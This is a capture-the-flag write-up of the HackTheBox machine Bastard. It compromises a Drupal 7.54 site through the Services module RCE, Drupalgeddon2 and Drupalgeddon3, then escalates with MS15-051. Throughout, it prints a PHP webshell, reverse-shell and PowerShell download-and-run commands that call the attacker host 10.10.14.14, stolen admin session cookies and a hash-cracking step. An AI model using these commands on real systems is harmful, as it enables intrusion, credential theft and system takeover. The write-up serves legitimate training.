---
title: HTB: Bastard
url: https://0xdf.gitlab.io/2019/03/12/htb-bastard.html
date: 2019-03-12T09:00:00+00:00
difficulty: Medium [30]
os: Windows
tags: hackthebox, htb-bastard, ctf, web, drupal, drupalgeddon2, drupalgeddon3, droopescan, dirsearch, nmap, windows, searchsploit, nishang, ms15-051, smbserver, htb-devel, htb-granny, php, webshell, oscp-like-v1
---

![Bastard-cover](https://0xdfimages.gitlab.io/img/bastard-cover.png)

Bastard was the 7th box on HTB, and it presented a Drupal instance with a known vulnerability at the time it was released. I’ll play with that one, as well as two more, Drupalgeddon2 and Drupalgeddon3, and use each to get a shell on the box. The privesc was very similar to other early Windows challenges, as the box is unpatched, and vulnerable to kernel exploits.

## Box Info

| Name | [Bastard](https://hackthebox.com/machines/bastard)  [Bastard](https://hackthebox.com/machines/bastard) [Play on HackTheBox](https://hackthebox.com/machines/bastard) |
| --- | --- |
| Release Date | 18 Mar 2017 |
| Retire Date | 26 May 2017 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Bastard |
| Radar Graph | Radar chart for Bastard |
| First Blood User | 22 days12:47:24[vagmour vagmour](https://app.hackthebox.com/users/82) |
| First Blood Root | 23 days12:16:59[adxn37 adxn37](https://app.hackthebox.com/users/32) |
| Creator | [ch4p ch4p](https://app.hackthebox.com/users/1) |

## Recon

### nmap

`nmap` returns http (port 80) and two MSRPC ports (135 and 49154):

```

root@kali# nmap -sT -p- --min-rate 10000 -oA scans/alltcp 10.10.10.9
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-07 06:31 EST
Nmap scan report for 10.10.10.9
Host is up (0.018s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.44 seconds
root@kali# nmap -sU -p- --min-rate 10000 -oA scans/alludp 10.10.10.9                                                                                                                       
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-07 06:32 EST
Nmap scan report for 10.10.10.9
Host is up (0.016s latency).
All 65535 scanned ports on 10.10.10.9 are open|filtered

Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds
root@kali# nmap -sV -sC -p 80,135,49154 -oA scans/scripts 10.10.10.9                                                                                                                       
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-07 06:33 EST
Nmap scan report for 10.10.10.9
Host is up (0.017s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.94 seconds

```

I can also see that the website is running IIS 7.5, which is the [default IIS for Windows 7 / Server 2008r2](https://en.wikipedia.org/wiki/Internet_Information_Services). I’ll also see the webserver is hosting Drupal 7.

### Drupal - TCP 80

#### Site

The site is a Drupal page, without any content:

![1551959041984](https://0xdfimages.gitlab.io/img/1551959041984.png)

#### Version

The `nmap` scan showed me the output of the the `robots.txt` which included a `CHANGELOG.txt`. If I check the top of that page, I’ll see Drupal 7.54:

```

root@kali# curl -s http://10.10.10.9/CHANGELOG.txt | head

Drupal 7.54, 2017-02-01
-----------------------
- Modules are now able to define theme engines (API addition:
  https://www.drupal.org/node/2826480).
- Logging of searches can now be disabled (new option in the administrative
  interface).
- Added menu tree render structure to (pre-)process hooks for theme_menu_tree()
  (API addition: https://www.drupal.org/node/2827134).
- Added new function for determining whether an HTTPS request is being served

```

#### droopescan

I’m going to run `droopescan` to enumerate the Drupal site. Warning: This scan takes a long time to run:

```

root@kali# /opt/droopescan/droopescan scan drupal -u http://10.10.10.9

[+] Themes found:
    seven http://10.10.10.9/themes/seven/
    garland http://10.10.10.9/themes/garland/

[+] Possible interesting urls found:
    Default changelog file - http://10.10.10.9/CHANGELOG.txt
    Default admin - http://10.10.10.9/user/login

[+] Possible version(s):
    7.54

[+] Plugins found:
    ctools http://10.10.10.9/sites/all/modules/ctools/
        http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.txt
        http://10.10.10.9/sites/all/modules/ctools/changelog.txt
        http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.TXT
        http://10.10.10.9/sites/all/modules/ctools/LICENSE.txt
        http://10.10.10.9/sites/all/modules/ctools/API.txt
    libraries http://10.10.10.9/sites/all/modules/libraries/
        http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.txt
        http://10.10.10.9/sites/all/modules/libraries/changelog.txt
        http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.TXT
        http://10.10.10.9/sites/all/modules/libraries/README.txt
        http://10.10.10.9/sites/all/modules/libraries/readme.txt
        http://10.10.10.9/sites/all/modules/libraries/README.TXT
        http://10.10.10.9/sites/all/modules/libraries/LICENSE.txt
    services http://10.10.10.9/sites/all/modules/services/
        http://10.10.10.9/sites/all/modules/services/README.txt
        http://10.10.10.9/sites/all/modules/services/readme.txt
        http://10.10.10.9/sites/all/modules/services/README.TXT
        http://10.10.10.9/sites/all/modules/services/LICENSE.txt
    image http://10.10.10.9/modules/image/
    profile http://10.10.10.9/modules/profile/
    php http://10.10.10.9/modules/php/

[+] Scan finished (0:40:53.627982 elapsed)

```

#### searchsploit

Armed with the Drupal version, I’ll check `searchsploit` (I’ll snip the output to show ones that might match this version):

```

root@kali# searchsploit drupal
---------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                  |  Path
                                                                                                                | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------------------------------- ----------------------------------------
...[snip]...
Drupal 7.x Module Services - Remote Code Execution                                                              | exploits/php/webapps/41564.php
...[snip]...
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                        | exploits/php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                     | exploits/php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                             | exploits/php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                         | exploits/php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                | exploits/php/webapps/44448.py
...[snip]...
---------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

## Shell as iusr

### Exploits

There are distinct exploits for the core Drupal identified by `searchsploit`. Drupalgeddon2 (March 2018) and Drupalgeddon3 (April 2018) were both not known when this box was released in March 2017. So the intended exploit is likely “Drupal 7.x Module Services - Remote Code Execution”.

### Exploit in Module Services

#### Enumeration

I’ll use `-m` to get a copy of the script in my current dir, `searchsploit -m exploits/php/webapps/41564.php`, and open it up. There’s a section I need to customize, that will allow me to specify url, endpoint\_path, endpoint, filename, and data. I know the url already, but I need to find the endpoint\_path. For some reason `gobuster` wasn’t playing nice with bastard, but I [`dirsearch`](https://github.com/maurosoria/dirsearch) worked nicely (even if a bit slow):

```

root@kali# python3 /opt/dirsearch/dirsearch.py -u http://10.10.10.9/ -e php -x 403,404 -t 50

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: php | Threads: 50 | Wordlist size: 5963

Error Log: /opt/dirsearch/logs/errors-19-03-07_11-06-02.log

Target: http://10.10.10.9/

[11:06:03] Starting: 
[11:06:10] 400 -  324B  - /%ff/
[11:06:17] 200 -    7KB - /0
[11:06:27] 200 -    8KB - /%3f/
[11:24:18] 200 -  108KB - /CHANGELOG.txt
[11:24:18] 200 -  108KB - /ChangeLog.txt
[11:24:18] 200 -  108KB - /Changelog.txt
[11:24:18] 200 -  108KB - /changelog.txt
[11:24:18] 200 -  108KB - /CHANGELOG.TXT
[11:48:18] 301 -  150B  - /includes  ->  http://10.10.10.9/includes/
[11:48:48] 200 -    7KB - /index.php
[11:48:58] 200 -    7KB - /INDEX.PHP
[11:48:59] 200 -    7KB - /index.PHP
[11:49:12] 200 -    2KB - /INSTALL.mysql.txt
[11:49:12] 200 -    2KB - /install.mysql.txt
[11:49:12] 200 -    2KB - /INSTALL.pgsql.txt
[11:49:12] 200 -    2KB - /install.pgsql.txt
[11:49:14] 200 -   18KB - /INSTALL.txt
[11:49:14] 200 -   18KB - /Install.txt
[11:49:14] 200 -   18KB - /install.txt
[11:49:15] 200 -   18KB - /INSTALL.TXT
[11:49:27] 200 -    3KB - /install.php
[11:50:50] 200 -   18KB - /LICENSE.txt
[11:50:50] 200 -   18KB - /license.txt
[11:50:50] 200 -   18KB - /License.txt
[11:52:47] 200 -    9KB - /MAINTAINERS.txt
[11:54:06] 301 -  146B  - /misc  ->  http://10.10.10.9/misc/
[11:54:23] 301 -  149B  - /modules  ->  http://10.10.10.9/modules/
[11:56:18] 200 -    7KB - /node
[12:01:11] 301 -  150B  - /profiles  ->  http://10.10.10.9/profiles/
[12:01:57] 200 -    5KB - /README.txt
[12:01:57] 200 -    5KB - /Readme.txt
[12:01:57] 200 -    5KB - /readme.txt
[12:02:32] 200 -    2KB - /robots.txt
[12:02:37] 200 -   62B  - /rest/
[12:03:08] 301 -  149B  - /scripts  ->  http://10.10.10.9/scripts/
[12:03:08] 301 -  149B  - /Scripts  ->  http://10.10.10.9/Scripts/
[12:05:43] 301 -  147B  - /sites  ->  http://10.10.10.9/sites/
[12:10:34] 301 -  148B  - /themes  ->  http://10.10.10.9/themes/
[12:12:16] 200 -   10KB - /UPGRADE.txt
[12:12:58] 200 -    7KB - /user
[12:13:01] 200 -    7KB - /user/
[12:13:07] 200 -    7KB - /user/login/
[12:16:25] 200 -   42B  - /xmlrpc.php

Task Completed

```

I’ll see the `/rest` is a valid path. When I check it out, it gives me the endpoint:

```

root@kali# curl http://10.10.10.9/rest
Services Endpoint "rest_endpoint" has been setup successfully.

```

I’ll update the script:

```

$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => '0xdf.php',
    'data' => '<?php system($_REQUEST["cmd"]); ?>'
];

```

#### Execution

Before I run it, I will need to make sure php-curl is installed: `apt install php-curl`

I also need to fix a couple places where comments seem to have wrapped onto the next line. Once I get all that, I can run it:

```

root@kali# php 41564.php
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce

#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.10.10.9/0xdf.php

```

This gives me several options. Inside `session.json`, I now have the cookies for the administrator’s session:

```

{
    "session_name": "SESSd873f26fc11f2b7e6e4aa0f6fce59913",
    "session_id": "GCGJfJI7t9GIIV7M7NLK8ARzeURzu83jxeqI2_qcDGs",
    "token": "JNbtufcqf_g1Cyuln_fYeJH3oAmhKXQzy-MzEc0nIe0"
}

```

I also have information on the users in `user.json`:

```

{
    "uid": "1",
    "name": "admin",
    "mail": "drupal@hackthebox.gr",
    "theme": "",
    "created": "1489920428",
    "access": "1492102672",
    "login": 1551974856,
    "status": "1",
    "timezone": "Europe\/Athens",
    "language": "",
    "picture": null,
    "init": "drupal@hackthebox.gr",
    "data": false,
    "roles": {
        "2": "authenticated user",
        "3": "administrator"
    },
    "rdf_mapping": {
        "rdftype": [
            "sioc:UserAccount"
        ],
        "name": {
            "predicates": [
                "foaf:name"
            ]
        },
        "homepage": {
            "predicates": [
                "foaf:page"
            ],
            "type": "rel"
        }
    },
    "pass": "$S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE"
}

```

I can identify that hash as [Drupal 7](https://hashcat.net/wiki/doku.php?id=example_hashes), and try to break it:

```

$ hashcat -m 7900 admin.hash /usr/share/wordlists/rockyou.txt -o admin.cracked --force

```

However, that was going to take about three days on my system, and I don’t really need the password at this point.

Most useful, I have a webshell:

```

root@kali# curl http://10.10.10.9/0xdf.php?cmd=whoami
nt authority\iusr

```

#### Shell - nc

I’ll use `smbserver` to share a copy of `nc64.exe`, and use that to get a shell by visiting `http://10.10.10.9/0xdf.php?cmd=\\10.10.14.14\share\nc64.exe%20-e%20cmd.exe%2010.10.14.14%20443`

```

root@kali# rlwrap nc -lnvp 443                  
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443                     
Ncat: Listening on 0.0.0.0:443                   
Ncat: Connection from 10.10.10.9.               
Ncat: Connection from 10.10.10.9:63660.                        
Microsoft Windows [Version 6.1.7600]                
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
                                              
C:\inetpub\drupal-7.54>

```

### Drupalgeddon2

#### Python Script - Fail

One of the options for Drupalgeddon2 is a python script, so I started with that. I’ll use `-m` to get a copy of the script in, `searchsploit -m exploits/php/webapps/44448.py`. The script was a bit of a pain to get to run, but when I put in `'http://10.10.10.9/'`, it returns not vulnerable:

```

root@kali# python 44448.py 
################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): 'http://10.10.10.9/'
Not exploitable

```

#### Ruby Script

However, on [reading about Drupalgeddon2](https://unit42.paloaltonetworks.com/unit42-exploit-wild-drupalgeddon2-analysis-cve-2018-7600/#pu3blic-exploits), it seems this is testing the vulnerability on a Drupal 8 specific path.

I’ll try the `ruby` script, `searchsploit -m exploits/php/webapps/44449.rb`. Now I’ll run it, and it returns the help, and a warning:

```

root@kali# ruby 44449.rb 
ruby: warning: shebang line ending with \r may cause problems
Usage: ruby drupalggedon2.rb <target>
       ruby drupalgeddon2.rb https://example.com

```

I’ll fix the warning about `\r` with `dos2unix`:

```

root@kali# dos2unix 44449.rb 
dos2unix: converting file 44449.rb to Unix format...
root@kali# ruby 44449.rb 
Usage: ruby drupalggedon2.rb <target>
       ruby drupalgeddon2.rb https://example.com

```

Now I’ll run it against my target, and it crashes:

```

root@kali# ruby 44449.rb http://10.10.10.9/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[*] Target : http://10.10.10.9/
--------------------------------------------------------------------------------
[!] MISSING: http://10.10.10.9/CHANGELOG.txt (405)
[!] MISSING: http://10.10.10.9/core/CHANGELOG.txt (404)
[+] Found  : http://10.10.10.9/includes/bootstrap.inc (403)
[+] Found  : http://10.10.10.9/core/includes/bootstrap.inc (403)
[+] Drupal?: 8.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution
[*] Payload: echo FKIUAUXN
Traceback (most recent call last):                     
        2: from 44449.rb:207:in `<main>'
        1: from /usr/lib/ruby/vendor_ruby/json/common.rb:156:in `parse'
/usr/lib/ruby/vendor_ruby/json/common.rb:156:in `parse': 765: unexpected token at '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML+RDFa 1.0//EN" (JSON::ParserError)
...[snip]...

```

Interesting. It think’s `CHANGELOG.txt` is missing? But I looked at it earlier.

At the top of the script, there’s a place I can set a proxy. I’ll set it to localhost:

```

# Settings - Proxy information (nil to disable)
proxy_addr = '127.0.0.1'
proxy_port = 8080

```

I’ll clear my burp history, and then run the exploit:

![1551965316788](https://0xdfimages.gitlab.io/img/1551965316788.png)

The attempt to check `CHANGELOG.txt` is a POST, and it returns an error that the HTTP verb is bad:

```

HTTP/1.1 405 Method Not Allowed
Allow: GET, HEAD, OPTIONS, TRACE
Content-Type: text/html
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Thu, 07 Mar 2019 13:19:20 GMT
Connection: close
Content-Length: 1293

```

I’ll turn intercept on, and run the exploit again. This time, I’ll change POST to GET, and then let things go. I get a shell:

```

root@kali# ruby 44449.rb http://10.10.10.9/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[*] Target : http://10.10.10.9/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.9/CHANGELOG.txt (200)
[+] Drupal!: 7.54
--------------------------------------------------------------------------------
[*] Testing: Code Execution
[*] Payload: echo WVJGKBOE
[+] Result : WVJGKBOE
[{"command":"settings","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"368chTEHIkCulf-OByrxM4BA-4dnOTil83SURlLwdqI"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"368chTEHIkCulf-OByrxM4BA-4dnOTil83SURlLwdqI"}}}]
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: File Write To Web Root (./)
[*] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee ./s.php
[+] Result : [{"command":"settings","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"ZhoePAwixyS4fgsUjDewohxgu6fjhuZvkuZ-7g1o5Ow"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"ZhoePAwixyS4fgsUjDewohxgu6fjhuZvkuZ-7g1o5Ow"}}}]
[!] Target is NOT exploitable. No write access here!
[*] Testing: File Write To Web Root (./sites/default/)
[*] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee ./sites/default/s.php
[+] Result : [{"command":"settings","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"A0vSSq_CrSQFs5fhTMcTp4kmAIPC3kngzkEoGUcfU68"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"A0vSSq_CrSQFs5fhTMcTp4kmAIPC3kngzkEoGUcfU68"}}}]
[!] Target is NOT exploitable. No write access here!
[*] Testing: File Write To Web Root (./sites/default/files/)
[*] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee ./sites/default/files/s.php
[+] Result : [{"command":"settings","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"ihPSnSsmU8uU3SKBtuN2qCcnNQA1Ha9CqKpMiVhINfs"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"ihPSnSsmU8uU3SKBtuN2qCcnNQA1Ha9CqKpMiVhINfs"}}}]
[!] Target is NOT exploitable. No write access here!
--------------------------------------------------------------------------------
[!] FAILED to find writeable folder
[*] Dropping back to ugly shell...
drupalgeddon2>> whoami
nt authority\iusr

```

It turns out there’s also an [updated version](https://github.com/dreadlocked/Drupalgeddon2) on GitHub, and it works out of the box (and doesn’t print some annoying debug information).

#### Shell - Nishang

I can upgrade this to a [Nishang](https://github.com/samratashok/nishang) shell by grabbing a copy of `Invoke-PowerShellTcp.ps1`, adding a call to the function to the end, `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 443`, and then serving that directory with `python3 -m http.server 80`. I’ll also open a `nc` listener on port 443.

Then I give this command to the Drupalgeddon2 shell:

```

drupalgeddon2>> powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14/shell.ps1')

```

My `python` webserver gets the request for `shell.ps1` and sends it:

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.9 - - [07/Mar/2019 08:35:14] "GET /shell.ps1 HTTP/1.1" 200 -

```

When `shell.ps1` is run, it loads all the functions, and then invokes the reverse shell to me on port 443, which I get in `nc`:

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:59199.
Windows PowerShell running as user BASTARD$ on BASTARD
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\drupal-7.54>whoami
nt authority\iusr

```

### Drupalgeddon3

#### Enumeration

I’ll check out the details of Drupalgeddon3 using `searchsploit -x exploits/php/webapps/44542.txt`. Reading that, it says “You must be authenticated and with the power of deleting a node.” So it would not be an option taking this box from scratch. That said, I have access to the cookie for the admin thanks to the first exploit I ran, so I’ll give this a run using that.

First I’ll show that I can log in. I’ll use the Firefox plugin “Cookie Manager” to add a cookie “SESSd873f26fc11f2b7e6e4aa0f6fce59913=GCGJfJI7t9GIIV7M7NLK8ARzeURzu83jxeqI2\_qcDGs”. On refreshing, I see I’m now logged in as admin:

![1551978371907](https://0xdfimages.gitlab.io/img/1551978371907.png)

I also will want to get the node id of an existing node. If I click on “Find Content”, I can get a list of current content:

![1551979251624](https://0xdfimages.gitlab.io/img/1551979251624.png)

![1551979276991](https://0xdfimages.gitlab.io/img/1551979276991.png)

Clicking on the “REST” link takes me to `http://10.10.10.9/node/1`, so I’ll take it that node 1 exists.

#### Exploit

There’s a [python script](https://raw.githubusercontent.com/oways/SA-CORE-2018-004/master/drupalgeddon3.py) to execute the attack for me. I’ll grab a copy and run it to see it requires the url, the session cookie, an existing node, and the command:

```

root@kali# python drupalgeddon3.py 

[Usage]
python drupalgeddon3.py [URL] [Session] [Exist Node number] [Command]

[Example]
python drupalgeddon3.py http://target/drupal/ "SESS60c14852e77ed5de0e0f5e31d2b5f775=htbNioUD1Xt06yhexZh_FhL-h0k_BHWMVhvS6D7_DO0" 6 "uname -a"

```

Using the cookie info from the first exploit and the node I found earlier, I can now get RCE:

```

root@kali# python drupalgeddon3.py http://10.10.10.9/ "SESSd873f26fc11f2b7e6e4aa0f6fce59913=GCGJfJI7t9GIIV7M7NLK8ARzeURzu83jxeqI2_qcDGs" 1 "whoami"
nt authority\iusr

```

#### Shell - Nishang

So I can get a shell this way with Nishang:

```

root@kali# python drupalgeddon3.py http://10.10.10.9/ "SESSd873f26fc11f2b7e6e4aa0f6fce59913=GCGJfJI7t9GIIV7M7NLK8ARzeURzu83jxeqI2_qcDGs" 1 "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14/shell.ps1')"

```

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:62897.
Windows PowerShell running as user BASTARD$ on BASTARD
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\drupal-7.54>

```

## Privesc to system

### Enumeration

I ran `systeminfo` and noticed that there’s no service path or hotfixes applied to this box:

```

PS C:\inetpub\drupal-7.54> systeminfo

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00496-001-0001283-84782
Original Install Date:     18/3/2017, 7:04:46 ??
System Boot Time:          4/3/2019, 1:56:57 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2300 Mhz
                           [02]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2300 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.048 MB
Available Physical Memory: 1.550 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.582 MB
Virtual Memory: In Use:    513 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9

```

Immediately that points to a kernel exploit. I’ve done a few different ways to enumerate for Windows kernel exploits in recent posts ([Devel without MSF](/2019/03/05/htb-devel.html#privesc-web--system), [Devel with MSF](/2019/03/05/htb-devel.html#privesc-alternative-with-metasploit), [Granny with MSF](/2019/03/06/htb-granny.html#privesc-to-system)), so I won’t spend too much time enumerating here.

I like [this](https://github.com/51x/WHP) reference for finding Windows Exploits. MS15-051 jumps out as one I’ve used successfully before.

### MS15-051

I’ll grab it from here: https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip

I’ll use `smbserver` to share the 64-bit version. Then I’ll run:

```

PS C:\inetpub\drupal-7.54> \\10.10.14.14\share\ms15-051x64.exe "whoami"
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 3012 created.
==============================
nt authority\system

```

I can use it to get a shell as well:

```

C:\inetpub\drupal-7.54>\\10.10.14.14\share\ms15-051x64.exe "\\10.10.14.14\share\nc64.exe -e cmd.exe 10.10.14.14 443"
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 1612 created.
==============================

```

```

root@kali# rlwrap nc -lvnp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:50875.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
nt authority\system

```

Now I can get the flags:

```

C:\Users>type dimitris\desktop\user.txt
ba22fde1...

C:\Users>type administrator\desktop\root.txt.txt
4bf12b96...

```